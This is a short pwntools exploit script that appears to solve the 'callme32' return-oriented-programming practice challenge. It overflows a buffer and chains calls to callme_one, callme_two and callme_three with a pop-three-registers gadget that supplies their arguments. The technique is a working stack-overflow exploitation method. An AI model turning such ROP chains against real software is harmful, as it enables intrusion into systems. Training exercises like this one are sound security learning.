#!/usr/bin/env python3

from pwn import *

exe = './callme32'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

padding = 44

pop3 = 0x080487f9  # pop esi; pop edi; pop ebp; ret;

io = process(exe)
param1 = 0xdeadbeef
param2 = 0xcafebabe
param3 = 0xd00df00d

payload = flat(
    padding * asm('nop'), # to reach the EIP
    elf.symbols.callme_one, # Address in EIP
    pop3,
    param1,
    param2,
    param3,
    elf.symbols.callme_two,
    pop3,
    param1,
    param2, 
    param3,
    elf.symbols.callme_three,
    pop3,
    param1,
    param2,
    param3,
)

io.sendlineafter(b'>',payload)
io.interactive()
